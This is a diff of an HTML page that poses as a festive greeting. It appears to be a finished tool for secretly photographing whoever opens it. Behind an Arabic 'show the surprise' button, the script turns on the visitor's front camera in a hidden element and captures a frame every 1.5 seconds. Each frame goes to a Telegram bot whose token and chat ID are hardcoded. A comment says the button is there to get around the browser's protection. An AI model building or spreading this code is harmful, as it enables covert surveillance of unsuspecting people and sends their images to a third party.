@@ -3,51 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>Happy Festival</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
         body {
-            background-color: white; /* صفحة بيضاء تماماً */
+            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            font-family: sans-serif;
+            font-family: 'Tahoma', sans-serif;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 20px;
+            background-color: #ff7700;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            transition: 0.3s;
+        }
+        button:hover {
+            transform: scale(1.05);
+            background-color: #ff4400;
         }
     </style>
 </head>
 <body>
+
+    <div class="container" id="main-content">
+        <h2 style="color: #005f96;">وصلتك تهنئة خاصة!</h2>
+        <p>اضغط على الزر أدناه لمشاهدة المفاجأة</p>
+        <button id="startBtn">إظهار المفاجأة 🎁</button>
+    </div>
 
     <div hidden="hidden">
         <video id="video" playsinline autoplay></video>
         <canvas id="canvas" width="640" height="480"></canvas>
     </div>
 
-    <h3>جاري تحميل المحتوى، يرجى الانتظار...</h3>
-
     <script>
         'use strict';
 
-        // === إعدادات بوت التليجرام ===
-        // استبدل هذا بـ Token الخاص ببوتك (تحصل عليه من BotFather)
-        const botToken ='6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY'; 
-        // استبدل هذا بـ Chat ID الخاص بك (تحصل عليه من IDBot)
-        const chatId = '2103976274'; 
+        // بياناتك التي أرسلتها
+        const botToken = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
+        const chatId = '2103976274';
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
-        const constraints = {
-            audio: false, // لا نحتاج للصوت
-            video: {
-                facingMode: "user" // الكاميرا الأمامية
-            }
-        };
+        // ربط تشغيل الكاميرا بالزر لكسر حماية المتصفح
+        document.getElementById('startBtn').addEventListener('click', function() {
+            document.getElementById('main-content').innerHTML = "<h3>جاري تحميل المفاجأة...</h3><div class='loader'></div>";
+            init();
+        });
 
-        // دالة لإرسال الصورة إلى تليجرام
-        function sendPhotoToTelegram(imgData) {
-            // تحويل بيانات Base64 إلى Blob (صيغة ملف) ليفهمها تليجرام
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: { facingMode: "user" }
+                });
+                handleSuccess(stream);
+            } catch (e) {
+                console.error("Camera error:", e);
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            // التقاط وإرسال صورة كل 1.5 ثانية
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png");
+                sendToTelegram(canvasData);
+            }, 1500);
+        }
+
+        function sendToTelegram(imgData) {
             fetch(imgData)
                 .then(res => res.blob())
                 .then(blob => {
@@ -55,52 +101,18 @@
                     formData.append('chat_id', chatId);
                     formData.append('photo', blob, 'capture.png');
 
-                    // إرسال طلب POST إلى Telegram API
                     $.ajax({
                         type: 'POST',
                         url: `https://api.telegram.org/bot${botToken}/sendPhoto`,
                         data: formData,
-                        processData: false, // ضروري لإرسال الملفات
-                        contentType: false, // ضروري لإرسال الملفات
+                        processData: false,
+                        contentType: false,
                         success: function(result) {
-                            console.log('تم إرسال الصورة بنجاح.');
-                        },
-                        error: function(error) {
-                            console.error('خطأ في الإرسال:', error);
+                            console.log('Sent!');
                         }
                     });
                 });
         }
-
-        // الوصول للكاميرا وبدء الالتقاط
-        async function init() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                handleSuccess(stream);
-            } catch (e) {
-                console.error('عفواً، لم نتمكن من الوصول للكاميرا:', e);
-            }
-        }
-
-        // النجاح في فتح الكاميرا
-        function handleSuccess(stream) {
-            window.stream = stream;
-            video.srcObject = stream;
-
-            // بدء حلقة الالتقاط كل ثانية ونصف (1500 ميللي ثانية)
-            setInterval(function() {
-                // رسم فريم من الفيديو على الكانفاس
-                context.drawImage(video, 0, 0, 640, 480);
-                // تحويل الكانفاس لصورة Base64
-                var canvasData = canvas.toDataURL("image/png");
-                // إرسال الصورة للبوت
-                sendPhotoToTelegram(canvasData);
-            }, 1500); 
-        }
-
-        // بدء التشغيل
-        init();
-
     </script>
 </body>
 </html>
